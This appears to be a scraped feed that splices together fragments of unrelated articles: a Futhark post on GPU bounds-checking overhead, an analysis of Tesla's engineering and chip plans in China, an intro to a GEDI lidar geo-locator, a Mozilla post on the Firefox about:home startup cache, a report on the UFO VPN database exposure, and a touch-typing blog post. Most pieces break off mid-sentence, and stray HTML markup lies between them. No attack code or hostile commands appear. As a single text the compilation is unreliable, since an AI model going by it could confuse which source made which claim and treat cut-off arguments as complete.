<p>If so, that must mean one of the preceding kernels has encountered a failure, and so the all threads of the current kernel terminate immediately. Checking <code>global_failure</code> on the GPU is much faster than checking it on the CPU, because it does not involve any synchronisation or copying. The overhead is a single easily cached global memory read for every thread, which is in most cases negligible. Asynchronous checking performs like this:</p>
<p><img src="https://futhark-lang.org/images/2020-07-13-overhead-async.png" alt="Slowdown of synchronous bounds checking compared to no bounds checking."></p>
<p>Much better! The mean overhead is down to <em>1.07x</em> (compared to <em>1.66x</em> before), and the maximum overhead is <em>1.4x</em> (<em>6x</em> before). The slowest program is now the <a href="https://github.com/diku-dk/futhark-benchmarks/blob/master/rodinia/srad/srad.fut">srad</a> benchmark, which is structured roughly as follows:</p>

<p>The <code>reduce</code> runs on the GPU but produces a scalar, which in Futhark’s compilation model is copied back to the CPU where a tiny amount of sequential computation takes place, after which it is used to update the <code>image</code> array in various ways. The fact that we copy a value (even just a single number!) back to the CPU forces us to do a full synchronisation and also check <code>global_failure</code>. This is because the compiler is conservative - it does not understand that <code>x</code> is not going to be used for any CPU-side control flow, but is instead going to be sent right back to the GPU. Since each instance of <code>reduce</code> and <code>map</code> run for extremely short periods (little more than a dozen microseconds each), the communication cost becomes significant. This was already a problem, but bounds checking makes it worse.</p>
<p>The solution to this is not directly related to bounds checking at all, but is about refining our compilation model such that individual scalars are more aggressively kept on the GPU, if we can determine that their value is not truly needed on the CPU. As a side effect, this will allow us to delay checking <code>global_failure</code> until the entire outermost sequential loop has run, which will make the overhead of bounds checking essentially zero. But this is future work.</p>
<h2 id="cross-thread-communication"><a href="#cross-thread-communication" id="cross-thread-communication-link" title="cross-thread-communication">Cross-thread communication</a></h2>
<p>So far, we have assumed that a GPU thread, upon encountering an error, can safely terminate itself, or even the entire kernel. Unfortunately, reality is not so forgiving. A GPU thread can terminate itself, sure, but this can induce deadlocks if the kernel contains <a href="https://en.wikipedia.org/wiki/Barrier_(computer_science)">barriers</a>, because other threads may be waiting for the now-terminated thread. Life would be easier if the prevailing GPU APIs (CUDA and OpenCL) provided a way for a single thread to unilaterally abort execution of the entire kernel, but they don’t. The solution to this is a little hairy, and involves the failing thread jumping ahead to the next barrier instead of simply terminating, then after each barrier checking whether any threads have failed. See <a href="https://futhark-lang.org/publications/hlpp20.pdf">the paper</a> for the full details. It’s a solution that relies heavily on all communication being under the control of the compiler, so it’s not something you could do for a low-level GPU language.</p>
<h2 id="optimisations"><a href="#optimisations" id="optimisations-link" title="optimisations">Optimisations</a></h2>
<p>All effective and elegant implementation techniques must inevitably be followed by a collection of ad-hoc micro-optimisations of dubious impact, and bounds checking in Futhark is no different. Some of the special cases we handle are as follows:</p>
<ol type="1">
<li>Certain particularly simple kernels are able to execute safely even when previous kernels have failed, typically because they merely copy or replicate memory. Matrix transposition is an example of such a kernel. For these kernels we can eliminate all failure checking entirely, because bounds failures cannot result in memory becoming <em>inaccessible</em>, it can only result in the values stored being <em>wrong</em>, and these simple kernels are not sensitive to the values they are copying.</li>
<li>Some kernels may contain no bounds checks. They still need to check whether any previous kernels have failed, but do not need to be careful with respect to barriers and such.</li>
<li>At run-time, whenever we enqueue a kernel, we have dynamic knowledge of whether any kernels with bounds checks have been enqueued since the last time <code>global_failure</code> was checked. That is, we know dynamically whether <code>global_failure</code> is <em>certainly unset</em>. If so, we can pass that information along to the kernel as a kernel argument, which means the kernel does not have to check the value of <code>global_failure</code> in its prelude.</li>
</ol>
<p>The impact of these optimisations (and others covered in the paper) is quite minor, as shown in the following graph.</p>
<p><img src="https://futhark-lang.org/images/2020-07-13-overhead.png" alt="Slowdown of synchronous bounds checking compared to no bounds checking."></p>
<p>Most of the optimisations were motivated by micro-benchmarks, where the impact is more significant. On these benchmarks, they reduce the mean overhead to <em>1.04x</em> (from <em>1.07x</em>), and have no impact on the maximum overhead. Useful, but not crucial the way asynchronous checking is.</p>
<h2 id="error-messages"><a href="#error-messages" id="error-messages-link" title="error-messages">Error messages</a></h2>
<p>As discussed above, <code>global_failure</code> contains only a single bit of information: did the program fail or not? But the modern programmer is accustomed to luxuries such as being told <em>where</em> it failed, so clearly this will not do. The solution is simple. At compile time, we associate each bounds check with a unique number, a <em>failure code</em>, with a <code>global_failure</code> value of <em>-1</em> meaning <em>no error so far</em>. When a bounds check fails, the thread writes the failure code corresponding to the bounds check. At compile-time we also construct a table that maps each failure code to a <code>printf()</code>-style format string such as the following:</p>
<pre><code>"index %d out of bounds for array of size %d"</code></pre>
<p>For simplicity, <code>%d</code> is the only format specifier that can occur, but each distinct format string can contain a different number of format specifiers. We …</p></div></div>

                    <p>Tesla may well be the biggest driver of China’s journey towards technological self-reliance, as the “Tech Cold War” between the U.S. and China deepens. This observation wasn’t obvious to me until I listened (three times) to Elon Musk’s Q&amp;A session at the 2020 World Artificial Intelligence Conference in Shanghai earlier this month.</p><p>【想看<a href="https://interconnected.blog/tesla-china-the-tech-cold-war/#chinese-version-below">中文的读者请点击这里</a>或滚动到本页下方】</p><p>While most of the media coverage focused on<a href="https://venturebeat.com/2020/07/09/elon-musk-says-tesla-is-very-close-to-level-5-autonomous-driving/"> Musk’s bold proclamation</a><a href="https://www.forbes.com/sites/johnkoetsier/2020/07/09/elon-musk-tesla-will-have-level-5-self-driving-cars-this-year/#1cd954a32d1d"> that Tesla is</a><a href="https://futurism.com/elon-musk-tesla-close-level-5-autonomy"> very close to achieving</a> Level-5 autonomous driving capabilities, <strong>the entirety of what he said</strong> during the Q&amp;A has far-reaching implications, technologically and geopolitically.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/Mwe2ABPkZLU?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="local-hire-original-engineering-open-patents">Local Hire, Original Engineering, Open Patents</h2><p>Musk’s Q&amp;A was, first and foremost, an aggressive recruiting pitch for the engineering team that Tesla is building in China. What’s most noteworthy is his emphasis that the Tesla China team will be doing “original engineering”.</p><p>This emphasis is important for three reasons:</p><p><strong>1. Local optimization:</strong> for self-driving to work well, where your engineers are physically located play a surprisingly important role. Musk shared that Tesla’s Autopilot works best in California, because the company’s engineers are mostly in California, thus they can do local optimization most effectively to adapt to the reality in California. The plan is: once self-driving works well in California, the software can be adapted to other locations with varying degrees of further local optimization.</p><p>In order for Tesla's Autopilot to work well in China, it needs a local engineering team capable of what its team is doing in California. Thus, “original engineering” makes perfect product sense if Tesla wants to deliver self-driving cars in China -- a growing electric vehicle market where Tesla is taking a large chunk, according to research by ARK Investment. Beyond the engineering and product rationale, it is also <strong>a killer recruiting pitch for the best and brightest</strong>; no talented engineer wants to spend the day refactoring and adapting someone else’s code.</p><figure><img src="https://interconnected.blog/content/images/2020/07/tesla-china-market-share-1.png" alt="" srcset="https://interconnected.blog/content/images/size/w600/2020/07/tesla-china-market-share-1.png 600w, https://interconnected.blog/content/images/2020/07/tesla-china-market-share-1.png 854w" sizes="(min-width: 720px) 720px"></figure><p><strong>2. Friendlier regulators:</strong> In his Q&amp;A, Musk’s confidence in achieving L5 is tempered by the reality that neither he nor anyone else knows what is the level of safety that must be achieved to convince regulators. Twice as safe as a human driver? 10-times? 100-times? Or in Musk’s words, how many 9’s after 99% is needed? We don’t know.</p><p>Regulators play a decisive role in the pace of self-driving advancement, more so than most other tech sectors. For a regulator to make a judgment on the safety threshold, it’s a combination of hard evidence and political will plus incentives. Assuming we have the same safety evidence, then the Chinese government currently has more appetite to experiment with and invest in AI than the U.S. government. <strong>Thus, Chinese regulators of all levels are more incentivized to say “yes” to things, while their American counterparts are more incentivized to say “no”.</strong> This political will was on full display at this AI conference, where the Party Committee Secretary of Shanghai, <a href="https://en.wikipedia.org/wiki/Li_Qiang">Li Qiang</a>, more or less presided over the entire keynote session, where almost every speaker ritualistically praised his leadership at the beginning of each talk. Li’s presence is a big deal, as Shanghai tries to lead China’s AI future, having lost out on the other tech trend booms to Beijing, Shenzhen, and Hangzhou. Tesla’s China GigaFactory is already located in Shanghai. It’s likely that Tesla will continue to receive more favorable regulatory treatment in Shanghai than in California or anywhere else in the U.S.</p><p><strong>3. Reduced risk of sanctions:</strong> With “original engineering”, Tesla China creates original IP that will not be subjected to future U.S. sanctions. Thus, this approach is effective for recruiting and important for Tesla’s own long-term development. China, in turn, will rightfully have access to the IP generated from Tesla China.</p><p>But what’s more important is that Tesla doesn’t care about patents anyways. In 2014, it decided to open source its entire patent portfolio related to building an electric vehicle. In Musk’s mind, patent protection is an impediment not accelerant to technological advancement. In <a href="https://www.tesla.com/blog/all-our-patent-are-belong-you">his blog post</a> announcing the no-patent decision, he wrote:</p><blockquote><em>“<strong>Technology leadership is not defined by patents</strong>, which history has repeatedly shown to be small protection indeed against a determined competitor, but rather by the <strong>ability of a company to attract and motivate the world’s most talented engineers</strong>. We believe that</em><a href="https://www.tesla.com/about/legal#patent-pledge"><em> applying the open source philosophy to our patents</em></a><em> will strengthen rather than diminish Tesla’s position in this regard.” [Bold emphasis mine]</em></blockquote><p>Tesla is flexing its muscle to attract and motivate the most talented engineers in China. When they do develop the self-driving technology needed for Tesla (and yes, I believe it is a “when” not “if”), chances are all that technology will be open sourced for anyone in China and the world to do the same. <strong>Open source technology</strong>, as the Linux Foundation <a href="https://www.linuxfoundation.org/blog/2020/07/understanding-us-export-controls-with-open-source-projects/">clarified in its whitepaper earlier this month</a>, is <strong>not subjected </strong>to the U.S. government’s various export control restrictions.</p><p>Of course, achieving self-driving is not just an algorithm and software engineering challenge, but also a hardware one. To understand that piece of the puzzle, let’s look at Tesla’s custom-designed Full Self-Driving (FSD) chip in the context of China’s current chip manufacturing capabilities.</p><h2 id="what-is-fsd">What is FSD?</h2><p>Tesla began developing its own <a href="https://en.wikichip.org/wiki/tesla_(car_company)/fsd_chip#SoC">FSD chip</a> in 2016. In 2019, it began volume production and deployed these FSD chips inside Model X, S, and 3. It is an 8-bit chip (not the more powerful 32-bit or 64-bit general purpose chip), in order to satisfy the specific computation needs of a self-driving car but nothing more. Thus far, Samsung manufactures the chips using its 14nm process at its Austin, Texas foundry. A self-driving chip does not have as high a requirement in terms of form factor (or size) as a smartphone or smaller device, thus the 14nm process is sufficient.</p><figure><img src="https://interconnected.blog/content/images/2020/07/tesla_fsd_computer_board-small.jpg" alt="" srcset="https://interconnected.blog/content/images/size/w600/2020/07/tesla_fsd_computer_board-small.jpg 600w, https://interconnected.blog/content/images/2020/07/tesla_fsd_computer_board-small.jpg 745w" sizes="(min-width: 720px) 720px"><figcaption>Tesla FSD board. Source: https://en.wikichip.org/wiki/tesla_(car_company)/fsd_chip#SoC</figcaption></figure><p>The FSD chip is highly optimized to do one particular mathematical operation very efficiently: <a href="https://www.khanacademy.org/math/precalculus/x9e81a4f98389efdf:matrices/x9e81a4f98389efdf:properties-of-matrix-multiplication/a/matrix-multiplication-dimensions"><strong>dot product</strong></a>. It’s how you do matrix multiplications -- an operation that a neural network needs to do many many times, especially for a <a href="https://en.wikipedia.org/wiki/Convolutional_neural_network">convolutional neural network</a>. In order for a self-driving car to “see” what’s going on while driving, it has to do a lot of dot products to compute all the image data gathered from its surrounding, frame by frame, before deciding what to do, if anything. And the car must be able to do this constantly for a long time without overheating or slowing down performance. The FSD’s performance apparently exceeds an Nvidia alternative’s by 21-times, while consuming much less power.</p><p>Each Tesla car is installed with two of these chips to add redundancy and improve decision-making: if the two chips “disagree”, the decision is thrown out and the computer starts a new compute and inference cycle on new data. <strong>Essentially, each Tesla has two “brains” to keep each other honest.</strong></p><h2 id="can-china-make-fsd">Can China Make FSD?</h2><p>As I’ve described in a previous deep dive post, <strong>“</strong><a href="https://interconnected.blog/riscv-china-nightingales/"><strong>RISC-V, China, Nightingales</strong></a><strong>”, </strong>China’s largest chip foundry SMIC does have 14nm capabilities. In fact, SMIC’s co-CEO Liang Mong-song, who is credited with bringing the 14nm capabilities to the foundry, was a TSMC veteran and also instrumental in helping Samsung first achieve its own 14nm process, which is being used to manufacture the FSD chips right now. These chips are <a href="https://en.wikichip.org/wiki/tesla_(car_company)/fsd_chip#SoC">designed based on the ARMv8.0-A</a> instruction set architecture (ISA), which isn’t subject to U.S. sanctions since ARM is a UK company.</p><p>That being said, the <a href="https://www.nytimes.com/2020/07/14/business/huawei-uk-5g.html">UK recently banned Huawei completely</a>, reversing its earlier decision that allowed Huawei to build the “non-core” portions of its 5G network. This decision may signal a stronger willingness by UK regulators to either push out Chinese companies or prevent technologies from going to China, as it moves closer to the U.S. in this Tech Cold War.</p><p>To further muddle the picture, Softbank <a href="https://www.wsj.com/articles/softbank-explores-options-for-chip-designer-arm-holdings-11594672437">who owns ARM is mulling a sale</a> after buying it for $32 billion USD four years ago. Meanwhile, RISC-V, the open source ISA, is not yet mature enough to design a self-driving optimized chip like the FSD</p><p>Needless to say, there are many moving pieces to keep track of. SMIC is facing many challenges as it grows into a world-class chip foundry. It has had trouble acquiring advanced lithography technology from the Dutch company ASML, <a href="https://www.reuters.com/article/us-asml-holding-usa-china-insight/trump-administration-pressed-dutch-hard-to-cancel-china-chip-equipment-sale-sources-idUSKBN1Z50HN">due to pressure from the Trump administration</a>. Without ASML’s technology, SMIC will have a hard time advancing beyond the 14nm process to 7nm or denser processes. It will also have trouble acquiring other EDA tools to scale its production capacity, because the<a href="https://mp.weixin.qq.com/s/7phT1v0G45m87JU6s7W5bA"> dominant suppliers are mostly American</a>. Depending on who you ask, SMIC’s future is still pretty bleak, even with <a href="https://www.cnbc.com/2020/07/16/smic-chinas-biggest-chipmaker-surges-in-shanghai-listing.html">its successful IPO</a> on the Shanghai STAR market.</p><p>But at the end of the day, Tesla needs 14nm capabilities and SMIC has them. In fact, <strong>it would make sense for Tesla to be a customer of China-made chips for its China-made cars</strong>. This arrangement will help Tesla avoid future restrictions if U.S. sanctions widen to include its current chip production in Austin. Producing FSD chips at scale for a high-caliber customer like Tesla will push SMIC to up its game on manufacturing quality and operational efficiencies. Combined with the software advancement in AI from the local engineering team, Tesla can end up giving China’s technology ecosystem quite a boost.</p><h2 id="ambition-and-pragmatism">Ambition and Pragmatism</h2><p>Tesla is not only an ambitious company, it’s also a pragmatic one. <strong>Ambitious pragmatism</strong> is what a company, and I’d argue a country, needs to both survive and thrive. In the last Cold War between the U.S. and U.S.S.R., there was actually a lot of ambitious pragmatism that catalyzed technological advancements, like rocketry, satellites, and the space program. So far, the current conflict between the U.S. and China looks totally …</p></div></section></article></div></div></div>

    <p>Remote sensing instruments like <a href="https://gedi.umd.edu/">NASA’s GEDI</a>, which is mounted to the <a href="https://iss.jaxa.jp/en/kiboexp/ef/">Japanese Experiment Module – Exposed Facility (JEM-EF)</a> on the International Space Station (ISS), produce a massive amount of data and one of the tools scientists use when working with those data is a <em>geo-locator</em>–a geographic coordinates search engine.</p>



<p>GEDI, launched in 2018, is the most powerful lidar instrument in orbit today. The files for version 1 data, which had an initial public release in early 2020, are organized by orbit instead of by <em>tile</em> or grid system. This presents a unique challenge to searching the data efficiently.</p>



<p>This paper looks at how a software developer or scientist might go about creating a GEDI geo-locator–similar in functionality to existing NASA offerings. We dive into how the coordinate data is structured, ways to mathematically generalize the orbit data, and we then build a solution using Python. In a series of explanations we move through an arc of exploration as we think about solving the challenges encountered. The resulting prototype geo-locator leverages a number of Python libraries popular in GIS today and achieves a considerable level of accuracy and performance.</p>

<h2>Don’t bury the lede</h2>



<p>We’re working on a thing to make Firefox start faster! It appears to work! Here’s a video showing off a before (left) and after (right):</p>



<figure><p><span><iframe width="625" height="352" src="https://www.youtube.com/embed/027tOvYZw88?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span>

<h2>Improving Firefox Startup Time With The about:home Startup Cache</h2>



<p>For the past year or so, the Firefox Desktop Front-End Performance team has been concentrating on making improvements to browser startup performance.</p>



<p>The launching of an application like Firefox is quite complex. Meticulous profiling of Firefox startup in various conditions has, thankfully, helped reveal a number of opportunities where we can make improvements. We’ve been evaluating and addressing these opportunities, and several have made it into the past few Firefox releases.</p>



<p>This blog post is about one of those improvements that is currently in the later stages of development. I’m going to describe the improvement, and how we went about integrating it.</p>



<p>In a default installation of Firefox, the first (and only) tab that loads is about:home<sup id="rf1-3036"><a href="#fn1-3036" title="This is only true if the user hasn’t just restarted after applying an update, and if they haven’t set a custom home page or configured Firefox to restore their previous session on start." rel="footnote">1</a></sup>.</p>



<figure><img data-attachment-id="3038" data-permalink="https://mikeconley.ca/blog/2020/07/13/improving-firefox-startup-time-with-the-abouthome-startup-cache/abouthome/" data-orig-file="https://mikeconley.ca/blog/wp-content/uploads/2020/07/abouthome.png" data-orig-size="1144,853" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="abouthome" data-image-description="" data-medium-file="https://mikeconley.ca/blog/wp-content/uploads/2020/07/abouthome-300x224.png" data-large-file="https://mikeconley.ca/blog/wp-content/uploads/2020/07/abouthome-1024x764.png" src="https://mikeconley.ca/blog/wp-content/uploads/2020/07/xabouthome-1024x764.png.pagespeed.ic.IW4h6O6qkj.png" alt="" srcset="https://mikeconley.ca/blog/wp-content/uploads/2020/07/xabouthome-1024x764.png.pagespeed.ic.IW4h6O6qkj.png 1024w, https://mikeconley.ca/blog/wp-content/uploads/2020/07/xabouthome-300x224.png.pagespeed.ic.wVhPlDDCdi.jpg 300w, https://mikeconley.ca/blog/wp-content/uploads/2020/07/xabouthome-768x573.png.pagespeed.ic.FO3Xg95rAi.png 768w, https://mikeconley.ca/blog/wp-content/uploads/2020/07/xabouthome-624x465.png.pagespeed.ic.SojSX9wUNG.png 624w, https://mikeconley.ca/blog/wp-content/uploads/2020/07/xabouthome.png.pagespeed.ic.wA72oZvGF2.png 1144w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The about:home page is actually the same thing that appears when you open a new tab (about:newtab). The fact that they have different addresses allows us to treat their loading differently.</p>



<p>Your about:home might look slightly different from the above — depending on your locale, it may or may not include the Pocket stories.</p>



<p>Do not be fooled by what appears to be a very simple page of images and text. This page is actually quite sophisticated under the hood. It is designed to be customized by the user in the following ways:</p>



<p>Users can</p>



<ul><li>Collapse or expand sections</li><li>Remove sections entirely</li><li>Reorganize the order of their Top Sites by dragging and dropping</li><li>Pin and unpin Top Sites to their positions</li><li>Add their own custom Top Sites with custom thumbnails</li><li>Add or remove search engines from their Top Sites</li><li>Change the number of rows in the Top Sites and Recommended by Pocket sections</li><li>Choose to have the Highlights composed of any of the following:<ul><li>Visited pages</li><li>Recent bookmarks</li><li>Recent downloads</li><li>Pages recently saved to Pocket</li></ul></li></ul>



<p>The user can customize these things at any time, and any open copies of the page are expected to reflect those customizations immediately.</p>



<p>There are further complexities beyond user customization. The page is also designed to be easy for our design and engineering teams to experiment with reorganizing the layout and composition of the page so that they can test variations on its layout in the wild.</p>



<p>The about:home page also has special privileges not afforded to normal websites. It can</p>



<ul><li>Save and remove bookmarks</li><li>Add pages to Pocket</li><li>Cause the URL bar to be focused and selected</li><li>Show thumbnails for pages that the user has visited</li><li>Access both high and normal resolution favicons</li><li>Render information about the user’s recent activity (recent page visits, downloads, saves to Pocket, etc.)</li></ul>



<p>So while at first glance, this appears to be a static page of just images and text, rest assured that the page can do much more.</p>



<p>Like the Firefox Developer Tools UI, about:home is written with the help of the React and Redux libraries. This has allowed the about:home development team to create sophisticated, reusable, and composable components that could be easily tested using modern JavaScript testing methods.</p>



<p>Unsurprisingly, this complexity and customizability comes at a cost. The page needs to request a state object from the parent process in order to have the Redux store populated and to have React render it. Essentially, the page is dynamically rendering itself after the markup of the page loads.</p>



<p>Startup is a critical time for an application. The user has expressed a need for their browser, and we have an obligation to serve the user as quickly and efficiently as possible. The user’s time is a resource that we should not squander. Similarly, because so much needs to occur during startup,<sup id="rf2-3036"><a href="#fn2-3036" title="You can think of startup like a traveling circus coming to town. You have to get the trucks and trailers parked, get the tents set up, hook up power, then lighting and sound … it’s a big, complex operation, and we haven’t even shot a clown out of a cannon yet." rel="footnote">2</a></sup> disk reads, disk writes, and CPU time are also considered precious resources. They should only be used if there’s no other choice.</p>



<p>In this case, we believed that the CPU time and disk accesses spent constructing the state object and dynamically rendering the about:home page was competing with all of the other CPU and disk access happening during startup, and this was slowing us down from presenting about:home to the user in a timely way.</p>



<p>Generally speaking, in my mind there are four broad approaches to performance problems once a bottleneck has been identified.</p>



<ul><li>You can widen the bottleneck (make the operations more efficient)</li><li>You can divide the bottleneck (split the work into smaller slices that can be done over a longer period of time with rests in between)</li><li>You can move the bottleneck (defer work until later when it seems that there is less competition for resources, or move it to a different thread)</li><li>You can remove the bottleneck (don’t do the work)</li></ul>



<p>We started by trying to apply the last two approaches, wondering what startup performance would be like if the page did not render itself dynamically, but was instead a static page generated periodically and pulled off of the disk at startup.</p>



<h2>Prototype when possible</h2>



<p>The first step to improving something is finding a way to measure it. Thankfully, we already have a number of logged measurements for startup. One of those measurements gives us the time from process start to rendering the Top Sites section of about:home. This is not a perfect measurement—ideally, we’d measure to the point that the page finally “settles” and stops changing<sup id="rf3-3036"><a href="#fn3-3036" title="<a href=&quot;https://bugzilla.mozilla.org/show_bug.cgi?id=1637024&quot;>We’re working on something like that</a>" rel="footnote">3</a></sup>—but for this project, this measurement served our purposes.</p>



<p>Before investing a bunch of time into a potential improvement, it’s usually a good idea to try to see if what you’re gaining is worth the development time. It’s not always possible to build a prototype for performance improvements, but in this case it was.</p>



<p>The team quickly threw together a static copy of about:home and <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1614352">hacked together a patch to load that document during startup, rather than dynamically rendering the page</a>. We then tested that page on our reference hardware. As of this writing, it’s been about five months since that test was done, but <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1614352#c2">according to this comment</a>, the prototype yielded what appears to be an almost 20% win on time from process start to about:home painting Top Sites.</p>



<p>So, with that information, we thought we had a real improvement opportunity here. We decided to proceed with the idea, and began a long arduous search for “the right way to do it.”</p>



<h2>Pre-production</h2>



<p>As I mentioned earlier, about:home is complex. The infrastructure that powers it is complex. Coupled with the fact that no one on the Firefox Front-End Performance team had spent much time studying React and Redux meant that we had a lot of learning to do.</p>



<p>The first step was to get some React and Redux fundamentals under our belt. This meant building some small toy applications and getting familiar with the framework idioms and how things are organized.</p>



<p>With that grounding, the next step was to start reading the code — starting from the entrypoint into the code that powers about:home when the browser starts. <a href="https://docs.google.com/document/d/1zvDPcdqaZ7140nabNonQpD5Ln_nrAcJGBgFCJFG_0MM/edit#heading=h.1w5efh70rcvh">This was an intense period of study</a> that branched into many different directions. Part of the complexity was because much of the code is asynchronous and launched work on different threads, which introduced some non-determinism. While it is generally good for responsiveness to move work off of the main thread, it can lead to some complex reading and interpretation of the code when more than two threads are involved.</p>



<p>A tool we used during this analysis was the <a href="https://profiler.firefox.com/docs/#/">Firefox Profiler</a>, to get a realistic sense of the order of executions during startup. These profiles helped to inform much of our reading of the code.</p>



<p>This analysis helped us solidify our mental model of how about:home loads. With that model in place, it was much easier to propose practical approaches for introducing a static about:home document into the ecosystem of pre-existing code. <a href="https://docs.google.com/document/d/1zvDPcdqaZ7140nabNonQpD5Ln_nrAcJGBgFCJFG_0MM/edit#heading=h.1w5efh70rcvh">The Firefox Front-End Performance team documented our findings and recommendations</a> and then presented them to the team that originally built the about:home system to ensure that we were all on the same page and that we hadn’t missed anything critical. They were already aware that we were investigating potential performance improvements, and had very useful feedback for us, as well as historical product decision context that clarified our understanding.</p>



<p>Critically, we presented our recommendation for loading a static about:home page at startup and ensured that there were no upcoming plans for about:home that would break our mental model or render the recommendation no longer valid. Thankfully, it sounded like we were aligned and fine to proceed with our plan.</p>



<p>So what was the plan? We knew that since about:home is quite dynamic and can change over time<sup id="rf4-3036"><a href="#fn4-3036" title="As the user browses, bookmarks and downloads things, their Highlights and Top Sites sections might change. If Pocket is enabled, new stories will also be downloaded periodically." rel="footnote">4</a></sup> we needed a startup cache for about:home that could be periodically updated during the course of a browsing session. We would then load from that cache at startup. Clearly, I’m glossing over some details here, but that was the general plan.</p>



<p>As usual, no plan survives breakfast, and as we started to architect our solution, we identified things we would need to change along the way.</p>



<h2>Development</h2>



<p>We knew that the process that loads about:home would need to be able to read from the about:home startup cache. We also knew that about:home can potentially contain information about what pages the user has visited, and that about:home can do privileged things that normal web pages cannot. It seemed that this project would be a good opportunity to finish a project that was started (and mothballed) a year or so earlier: creating a special privileged content process for about:home. We would load about:home in that process, and add assertions to ensure that privileged actions from about:home could only happen from that content process type<sup id="rf5-3036"><a href="#fn5-3036" title="It’s vitally important that content processes have limited abilities. That way, if they’re ever compromised by a bad actor, there are limits to what damage they can do. The assertions mentioned in this case mean that if a compromised content process tries to “pretend” to be the privileged about content process by sending one of its messages, that the parent process will terminate that content process immediately." rel="footnote">5</a></sup></p>



<p>So getting the “privileged about content process”<sup id="rf6-3036"><a href="#fn6-3036" title="Naming is hard." rel="footnote">6</a></sup> fixed up and ready for shipping was the first step.</p>



<p>This also paved the way for …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-8973"><div><div><div><h2>UFO VPN which said it had a strict ‘no-logs policy’ exposed user log files including account passwords of 20 million users</h2><p>Researchers from Comparitech discovered an exposed database belonging to a Hong Kong-based VPN service provider called UFO VPN. The <a href="https://www.comparitech.com/blog/vpn-privacy/ufo-vpn-data-exposure/">Comparitch</a> researchers said that the database contained 20 million user logs including user passwords stored in plain text and was exposed for nearly 3 weeks. “It’s not clear how many users are affected, but our findings suggest that potentially all users who connected to UFO VPN at the time of exposure could be compromised. UFO VPN claims to have 20 million users on its website, and the database exposed more than 20 million logs per day,” Comparitech stated.</p><p>The database contained user information of both, UFO VPN free and paid service users. <span>The server where the data is hosted was first indexed on June 27 by the search engine&nbsp;</span><strong><span>Shodan.io</span></strong><span>. However, the exposed</span>&nbsp;database was discovered by researchers from Comparitech on July 1st, 2020. The researchers said that the data was exposed because the database hosted was on an unprotected Elasticsearch cluster. The 894 GB database contains the following user information :</p><ul><li>Account passwords in plaintext</li><li>VPN session secrets and tokens</li><li>IP addresses of both user devices and the VPN servers they connected to</li><li>Connection timestamps</li><li>Geo-tags</li><li>Device and OS description</li></ul><h2>UFO VPN’s strict no-logging policy</h2><p>UFO VPN is owned by Hong Kong-based ToolsForest Ltd. and has a<a href="https://ufovpn.io/privacy"> strict no-logging policy</a> and states that any data it collects is anonymized. But it looks like the user data is far from being anonymized. Comparitech researchers say that “based on the contents of the database, users’ information does not appear to be anonymous at all.”</p><p>The company though has a different explanation “In this server, all the collected information is anonymous and only be used for analyzing the user’s network performance &amp; problems to improve service quality. So far, no information has been leaked,” the company told Comparitech.</p><p>How much UFO VPN cares for the user data can also be seen from the fact that Comparitech reported the data exposure to it on 1st July and the database was secured on 15 July. The company told Comparitech that, “due to personnel changes caused by COVID-19, we’ve not found bugs in server firewall rules immediately, which will lead to the potential risk of being hacked. And now it has been fixed.”</p><p>This is what UFO VPN’s <a href="https://ufovpn.io/privacy">Privacy Policy</a> states, “<span>UFO VPN does not collect, monitor, or log any traffic or use of its Virtual Private Network service, under any circumstances, on any platform.” A privacy policy is essentially a contract entered into by the VPN provider and the users. Even after having such strict no-logging policy, if the company is collecting any user data for whatsoever reason, it should be sued.</span></p><p>It is particularly frightening that UFO VPN is based in Hong Kong and could have exposed Hong Kong protestors data to the Chinese authorities.</p></div></div></div></article></div>]]>

<![CDATA[Few thoughts on habits and touch typing]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://media.giphy.com/media/13GIgrGdslD9oQ/source.gif" alt=""></p>

<p>Mastering tools is a must-have in any profession. Can you imagine a construction worker trying to find a button to start a drill each time he needs to use it? Or a violinist trying to find appropriate strings while performing Beethoven's Violin Sonata no.9? It comes striking to me that so many software engineers with years of experience still struggle with something they do many times every day – typing.</p>

<p>Learning touch typing was a life changer for me, and I was the same. I always postponed practicing it, so after a few years of working in the industry, I almost developed my way of typing – not that efficient but still – using more than two fingers.</p>

<p>One day I've said enough is enough and started practicing a few minutes every day.</p>

<p><img src="https://i.snap.as/EDFKxd7.png" alt=""></p>

<p>You can see I suck on creating habits and had a few approaches to practice sessions, but the 1st of August 2016 was the day for me.</p>

<p>After intensive practice weeks, you can see how the frequency of practicing has dropper but has not stopped, which is a key to keep up your fingers in good shape.</p>

<p>I still do a few minutes of practice every day after those four years. I can say it becomes a habit of mine. It became my first conscious habit where the end goal was to get some skill.</p>

<p>I've tried many times to build up a good habit and failed miserably, I've wanted to read a few minutes a week, do learning for a few minutes, learn languages. The problem was that I was not using those skills in my day to day routine (I've been focusing on too much at once too); hence the only time I was exposed to those skills were those few minutes a day. And forgot about it for the rest of the day.</p>

<p>Some learnings from keeping my habits for a few years:</p>
<ul><li><p>I've learned a lot about myself and how should I approach any task that I'd like to become a habit of mine (I successfully do WaniKani lessons for three years now almost every day), most important thing is to use the skills you practice also outside the practice sessions (even when you use it inefficiently for the time being)</p></li>

<li><p>The habit should have a practical influence on how you work or live, having vague habit as “reading 10 minutes every day” does not work for me at all as I cannot see a clear goal of doing so (“getting wiser” is as vague as the habit itself). On the other hand, “learn how Ruby works under the hood by reading Ruby Under the Microscope book” makes much more sense to me. I have to quantify the habit to see the progress.</p></li>

